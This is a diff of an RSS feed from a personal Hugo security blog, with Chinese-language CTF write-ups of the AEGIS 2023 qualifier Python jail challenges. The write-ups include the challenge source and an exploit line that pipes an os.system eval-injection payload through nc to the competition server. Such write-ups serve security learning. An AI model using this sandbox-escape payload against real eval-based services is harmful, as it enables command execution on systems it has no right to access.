@@ -1,4 +1,46 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AEGIS :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/aegis/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/aegis/index.xml" rel="self" type="application/rss+xml"/><item><title>神盾盃2023初賽</title><link>https://bernie6401.github.io/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/index.html</guid><description>神盾盃2023初賽 Jail1 Source code while True: ip = input("AEGIS> ") if 'hint' in ip.lower(): print(__import__('os').system('cat jail.py')) exit() try: if 'flag' in ip.lower(): print("Sorry, I don't like any \"FLAG\"!") continue print(eval(ip)) except Exception as error: print("ERROR:", error) print("Good luck next time!") pass Recon 應該是基本的jail escape，可以看到source code中擋掉了flag string，所以可以直接用萬用字元一樣畫葫蘆就拿到flag，水題中的水題
-Exploit $ echo "print(__import__('os').system('cat fla*'))" | nc 35.234.20.42 8000 Flag: AEGIS{600d_j0b_70_byp455_fl46}
-Jail2 Background SSTI
-Source Code while True: ip = input("AEGIS> ") if 'hint' in ip.lower(): print(__import__('os').system('cat jail.py')) exit() try: print(eval(ip, {"__builtins__": {}}, {"__builtins__": {}})) except Exception as error: print("ERROR:", error) print("Good luck next time!") pass Recon 也是水題，既然block掉__builtins__ function，代表我們沒辦法使用print之類的function，但和前面的邏輯一樣，自己import就好</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AEGIS on SBK Hugo Site</title><link>https://bernie6401.github.io/tags/aegis/</link><description>Recent content in AEGIS on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/aegis/index.xml" rel="self" type="application/rss+xml"/><item><title>神盾盃2023初賽</title><link>https://bernie6401.github.io/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="神盾盃2023初賽">
+ 神盾盃2023初賽
+ &lt;a class="anchor" href="#%e7%a5%9e%e7%9b%be%e7%9b%832023%e5%88%9d%e8%b3%bd">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="jail1">
+ Jail1
+ &lt;a class="anchor" href="#jail1">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;AEGIS&amp;gt; &amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;hint&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ip&lt;span style="color:#f92672">.&lt;/span>lower():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(__import__(&lt;span style="color:#e6db74">&amp;#39;os&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;cat jail.py&amp;#39;&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;flag&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ip&lt;span style="color:#f92672">.&lt;/span>lower():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Sorry, I don&amp;#39;t like any &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">FLAG&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(eval(ip))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span> &lt;span style="color:#66d9ef">as&lt;/span> error:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;ERROR:&amp;#34;&lt;/span>, error)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Good luck next time!&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h3>
+&lt;p>應該是基本的jail escape，可以看到source code中擋掉了flag string，所以可以直接用萬用字元一樣畫葫蘆就拿到flag，水題中的水題&lt;/p>
+&lt;h3 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;print(__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat fla*&amp;#39;))&amp;#34;&lt;/span> | nc 35.234.20.42 &lt;span style="color:#ae81ff">8000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>AEGIS{600d_j0b_70_byp455_fl46}&lt;/code>&lt;/p>
+&lt;h2 id="jail2">
+ Jail2
+ &lt;a class="anchor" href="#jail2">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h3>
+&lt;p>SSTI&lt;/p></description></item></channel></rss>
